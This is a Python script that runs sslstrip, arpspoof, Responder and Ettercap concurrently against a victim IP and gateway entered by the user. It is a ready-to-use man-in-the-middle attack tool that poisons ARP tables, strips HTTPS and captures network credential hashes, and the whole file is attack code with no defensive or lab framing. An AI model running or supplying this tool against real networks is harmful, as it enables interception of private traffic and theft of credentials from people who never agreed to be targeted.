import asyncio
from rich.console import Console
from rich.panel import Panel

console = Console()


async def run_tool(tool_name, command, *args):
    output = f'[bold]{tool_name}[/bold]'
    console.print(Panel(output, title=tool_name))

    process = await asyncio.create_subprocess_exec(
        command, *args,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    async for line in process.stdout:
        output = f'[bold]{tool_name}[/bold]\n{line.decode("utf-8")}'
        console.print(Panel(output, title=tool_name))

    return process.returncode


async def start_sslstrip():
    return await run_tool('SSL Strip', 'sslstrip')


async def start_arpspoof(interface, victim_ip, gateway_ip):
    return await run_tool('ARP Spoof', 'arpspoof', '-i', interface, '-t', victim_ip, gateway_ip)


async def start_responder(interface):
    return await run_tool('Responder', 'responder', '-I', interface)


async def start_ettercap(interface, victim_ip, gateway_ip):
    return await run_tool('Ettercap', 'ettercap', '-T', '-q', '-i', interface, '-M', 'arp',
                          f'/{victim_ip}//{gateway_ip}//')


async def main():
    interface = input('Enter the interface (default: eth0): ') or 'eth0'
    victim_ip = input('Enter the victim IP: ')
    gateway_ip = input('Enter the gateway IP: ')

    sslstrip_task = asyncio.create_task(start_sslstrip())
    arpspoof_task = asyncio.create_task(start_arpspoof(interface, victim_ip, gateway_ip))
    responder_task = asyncio.create_task(start_responder(interface))
    ettercap_task = asyncio.create_task(start_ettercap(interface, victim_ip, gateway_ip))

    await asyncio.gather(sslstrip_task, arpspoof_task, responder_task, ettercap_task)


def run():
    asyncio.run(main())
